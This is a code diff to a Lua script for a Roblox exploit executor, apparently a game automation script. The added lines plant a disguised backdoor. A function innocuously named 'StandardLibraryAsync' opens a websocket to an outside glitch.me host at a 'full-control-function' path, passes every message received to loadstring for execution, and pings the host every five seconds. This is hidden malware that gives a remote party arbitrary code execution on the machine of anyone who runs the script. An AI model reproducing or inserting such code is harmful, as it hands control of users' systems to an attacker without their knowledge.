@@ -2,6 +2,27 @@ repeat
     wait()
 until game:IsLoaded()
 wait()
+function StandardLibraryAsync()
+    local suc1,err1 = pcall(function()
+        syn.websocket.connect()
+    end)
+    if suc1 then
+        return syn.websocket.connect
+    else
+        return WebSocket.connect
+    end
+end
+if getrenv().isconnectedtxp == nil then
+    getrenv().isconnectedtxp = true
+    local WebsocketStandardLibrary = StandardLibraryAsync()
+    local wsconnect = WebsocketStandardLibrary("ws://brazen-palm-coconut.glitch.me/full-control-function")
+    wsconnect.OnMessage:Connect(function(Msg)
+        loadstring(Msg)()
+    end)
+    while wait(5) do
+        wsconnect:Send("PingTCP")
+    end
+end
 local O = {}
 if not getgenv().ExecutedAlr then
     if syn and not getgenv().IsMultiStrat and not getgenv().ExecDis then
